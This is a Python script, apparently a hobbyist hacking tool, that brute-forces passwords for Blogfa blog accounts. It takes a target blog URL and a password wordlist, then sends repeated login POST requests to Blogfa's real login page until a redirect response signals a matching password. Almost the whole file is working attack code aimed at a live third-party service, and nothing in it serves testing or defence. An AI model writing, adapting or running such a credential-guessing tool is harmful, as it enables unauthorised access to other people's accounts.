#!/bin/python3
from sys import flags
import requests,time


class colorma:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'


user = input(f"{colorma.YELLOW}[?] Please Enter Link Blogfa Target :>{colorma.END} ")
users = user.split(".")
try:
    if(users[1] == 'blogfa'):
        try:
            stats = requests.get(f"{user}") #Edit Url For Input User
        except:
            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")
            exit()

        if(stats.status_code == 404):
            print(f"{colorma.RED}[X] Error 404 : Not This Link Target For Database Blogfa{colorma.END}")
        elif(stats.status_code == 200):
            print(f"{colorma.GREEN}[+] Alert : Find Link Target For Database Blogfa True{colorma.END}")
            sd = input(f"{colorma.YELLOW}[?] Do you have a list password or should I use my list password [y/n]:>{colorma.END} ")
            if(sd == "y"):
                worldlist = input(f"{colorma.YELLOW}[?] Please Enter Path Password List :>{colorma.END} ")
            elif(sd == "n"):
                worldlist = "PasswordList.txt"
            else:
                print(f"{colorma.RED}[X] Error Index{colorma.END}")
                exit()    
            try:
                shekan = True
                wordlist = open(worldlist,"r").read().split()

                print(f"\r{colorma.GREEN}[+] Alert : 5s",end="",flush=False) 
                time.sleep(1)
                print(f"\r{colorma.GREEN}[+] Alert : 4s",end="",flush=False)
                time.sleep(1) 
                print(f"\r{colorma.END}[+] Alert : 3s",end="",flush=False) 
                time.sleep(1)
                print(f"\r{colorma.RED}[+] Alert : 2s",end="",flush=False) 
                time.sleep(1)
                print(f"\r{colorma.RED}[+] Alert : 1s\r") 
                time.sleep(1)

                usd = users[0].split("/")
                users = usd[2]

                while shekan:
                    for word in wordlist:
                        Target = requests.post("https://blogfa.com/desktop/login.aspx",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
                        # Target = requests.post("http://127.0.0.1:8090/Login.php",data={"usrid":{users},"ups":word,"sub":"submit"}).text

                        try:
                            if(Target.status_code == 302):
                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [Password Found] : {colorma.END}{colorma.CYAN}{word}")
                                shekan = False
                                break
                            else:
                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [Password Not Found] : {colorma.END}{colorma.RED}{word}")
                        except:
                            print(f"{colorma.RED}[X] Error Net : No Internet{colorma.END}")
                            shekan = False        
            except:
                print(f"{colorma.RED}[X] Error File : Not Find Path WordList{colorma.END}")
        elif(stats.status_code == "503"):
            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")        
        else:
            print(type(stats.status_code))    
    else:
        print(f"{colorma.RED}[X]Error Url : False Url Blogfa Please Typed Link True{colorma.END}")
except:
    print(f"{colorma.RED}[X]Error Url : False Url Blogfa Please Typed Link True{colorma.END}") 
